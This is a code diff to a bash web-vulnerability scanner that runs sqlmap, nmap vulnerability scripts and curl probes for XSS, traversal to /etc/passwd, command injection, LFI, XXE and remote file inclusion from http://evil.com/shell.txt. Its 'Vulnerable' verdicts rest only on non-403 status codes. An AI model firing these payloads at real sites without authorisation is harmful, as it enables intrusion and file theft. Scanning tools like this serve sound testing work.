@@ -133,35 +133,50 @@ main() {
     sqlmap -u "$url" --batch --dbs
     echo -e "\n\n"
 
+
     # XSS test
     echo -e "\e[38;5;208m[+] Running XSS test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" -d \"<script>alert(1)</script>\" \"$url\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" -d "<script>alert(1)</script>" "$url"
+    xss_command="curl -s -o /dev/null -w \"%{http_code}\" -d \"<script>alert(1)</script>\" \"$url\""
+    echo -e "\e[32m${xss_command}\e[0m"
+    xss_status=$(eval $xss_command)
+    echo -e "XSS test: HTTP code: $xss_status"
+    if [ "$xss_status" -ne 403 ]; then
+       echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
 
     # CSRF test
     echo -e "\e[38;5;208m[+] Running CSRF test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" -X POST -d \"param=value\" \"$url\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" -X POST -d "param=value" "$url"
+    csrf_command="curl -s -o /dev/null -w \"%{http_code}\" -X POST -d \"param=value\" \"$url\""
+    echo -e "\e[32m${csrf_command}\e[0m"
+    csrf_status=$(eval $csrf_command)
+    echo -e "CSRF test: HTTP code: $csrf_status"
+    if [ "$csrf_status" -ne 403 ]; then
+       echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
 
     # Directory traversal test
     echo -e "\e[38;5;208m[+] Running Directory traversal test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" \"$url/../../etc/passwd\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" "$url/../../etc/passwd"
+    dir_traversal_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../etc/passwd\""
+    echo -e "\e[32m${dir_traversal_command}\e[0m"
+    dir_traversal_status=$(eval $dir_traversal_command)
+    echo -e "Directory traversal test: HTTP code: $dir_traversal_status"
+    if [ "$dir_traversal_status" -ne 403 ]; then
+       echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
 
     # Command injection test
     echo -e "\e[38;5;208m[+] Running Command injection test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" \"$url?cmd=ls\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" "$url?cmd=ls"
+    cmd_injection_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?cmd=ls\""
+    echo -e "\e[32m${cmd_injection_command}\e[0m"
+    cmd_injection_status=$(eval $cmd_injection_command)
+    echo -e "Command injection test: HTTP code: $cmd_injection_status"
+    if [ "$cmd_injection_status" -ne 403 ]; then
+       echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
-
-    # Host header injection test
-    # echo -e "\e[38;5;208m[+] Running Host header injection test...\e[0m"
-    # echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" -H \"Host: malicious.example.com\" \"$url\"\e[0m"
-    # curl -s -o /dev/null -w "%{http_code}" -H "Host: malicious.example.com" "$url"
-    # echo -e "\n\n"
 
     # Host header injection test
     echo -e "\e[38;5;208m[+] Running Host header injection test...\e[0m"
@@ -173,31 +188,39 @@ main() {
        echo -e "\e[31mVulnerable\e[0m"
     fi
     echo -e "\n\n"
-    
 
     # Path traversal test
     echo -e "\e[38;5;208m[+] Running Path traversal test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" \"$url/../../../../etc/passwd\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" "$url/../../../../etc/passwd"
+    path_traversal_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url/../../../../etc/passwd\""
+    echo -e "\e[32m${path_traversal_command}\e[0m"
+    path_traversal_status=$(eval $path_traversal_command)
+    echo -e "Path traversal test: HTTP code: $path_traversal_status"
+    if [ "$path_traversal_status" -ne 403 ]; then
+       echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
 
     # Local File Inclusion (LFI) test
     echo -e "\e[38;5;208m[+] Running Local File Inclusion (LFI) test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" \"$url?file=../../../../etc/passwd\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" "$url?file=../../../../etc/passwd"
+    lfi_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=../../../../etc/passwd\""
+    echo -e "\e[32m${lfi_command}\e[0m"
+    lfi_status=$(eval $lfi_command)
+    echo -e "Local File Inclusion (LFI) test: HTTP code: $lfi_status"
+    if [ "$lfi_status" -ne 403 ]; then
+        echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
 
     # Remote File Inclusion (RFI) test
     echo -e "\e[38;5;208m[+] Running Remote File Inclusion (RFI) test...\e[0m"
-    echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" \"$url?file=http://evil.com/shell.txt\"\e[0m"
-    curl -s -o /dev/null -w "%{http_code}" "$url?file=http://evil.com/shell.txt"
+    rfi_command="curl -s -o /dev/null -w \"%{http_code}\" \"$url?file=http://evil.com/shell.txt\""
+    echo -e "\e[32m${rfi_command}\e[0m"
+    rfi_status=$(eval $rfi_command)
+    echo -e "Remote File Inclusion (RFI) test: HTTP code: $rfi_status"
+    if [ "$rfi_status" -ne 403 ]; then
+        echo -e "\e[31mVulnerable\e[0m"
+    fi
     echo -e "\n\n"
-
-    # XML External Entity (XXE) test
-    # echo -e "\e[38;5;208m[+] Running XML External Entity (XXE) test...\e[0m"
-    # echo -e "\e[32mcurl -s -o /dev/null -w \"%{http_code}\" -d '<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>' \"$url\"\e[0m"
-    # curl -s -o /dev/null -w "%{http_code}" -d '<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [  <!ELEMENT foo ANY >  <!ENTITY xxe SYSTEM \"file:///etc/passwd\" >]><foo>&xxe;</foo>' "$url"
-    # echo -e "\n\n"
 
     # XML External Entity (XXE) test
     echo -e "\e[38;5;208m[+] Running XML External Entity (XXE) test...\e[0m"
@@ -206,9 +229,10 @@ main() {
     xxe_status=$(eval $xxe_command)
     echo -e "XML External Entity (XXE) test: HTTP code: $xxe_status"
     if [ "$xxe_status" -ne 403 ]; then
-       echo -e "\e[31mVulnerable\e[0m"
+        echo -e "\e[31mVulnerable\e[0m"
     fi
     echo -e "\n\n"
+
 
     # SSL/TLS scan
     echo -e "\e[38;5;208m[+] Running SSL/TLS scan...\e[0m"
@@ -224,7 +248,7 @@ main() {
 
     # Comprehensive Nmap scan with vulnerability scripts
     echo -e "\e[38;5;208m[+] Running comprehensive Nmap scan with vulnerability scripts...\e[0m"
-    echo -e "\e[32msudo nmap -sV -sC --script=vuln* -O $host \e[0m"
+    echo -e "\e[32msudo nmap -sV -sC --script=vuln* -A $host \e[0m"
     sudo nmap -sV -sC --script=vuln* -A $host
     echo -e "\n\n"
 
